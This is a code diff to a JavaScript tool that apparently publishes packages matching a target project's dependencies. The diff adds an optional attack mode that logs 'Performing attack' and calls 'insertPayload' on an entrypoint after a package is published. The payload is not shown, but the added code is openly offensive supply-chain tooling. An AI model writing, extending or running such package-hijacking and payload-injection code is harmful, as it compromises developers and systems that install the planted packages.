@@ -43,19 +43,29 @@ function createPackage(pkg, version) {
     return manager.createPackage(pkg, version) // return the promise
 }
 
-async function handleSubmission(submission) {
+async function handleSubmission(submission, shell_data, entrypoint) {
     const { manifest, job } = submission
     const response = await job
 
     if (response.status === 200) {
         success(`Package created successfully, available at \"${response.url}\"`)
         success(`Package data: ${manifest.name}@${manifest.version}`)
+
+        if (shell_data.attack) {
+            log(`Performing attack using ${manifest.name}@${manifest.version}`)
+            const result = manager.pm.insertPayload(entrypoint)
+            if (result) {
+                success(`Payload injected successfully`)
+            } else {
+                error(`Failed to inject payload`)
+            }
+        }
     } else {
         error(`Package creation failed, status code: ${response.status}`)
     }
 }
 
-async function setup({ pkgs, directory, entrypoint, accesstoken }) {
+async function setup({ pkgs, directory, entrypoint, accesstoken, shell_data }) {
     manager = new Nm(accesstoken)
     const { dependencies } = JSON.parse(fs.readFileSync(`${directory}/package.json`, 'utf8'))
     const is_valid_token = await manager.verifyToken()
@@ -82,8 +92,9 @@ async function setup({ pkgs, directory, entrypoint, accesstoken }) {
                 await handleSubmission(await createPackage({
                     pkg,
                     directory,
-                    version: target_version
-                }))
+                    version: target_version,
+                    shell_data
+                }), shell_data, entrypoint)
             } else if (state === 'suspicious') {
                 warning(`${pkg} is suspicious. Proceed with manual investigation.`)
             }
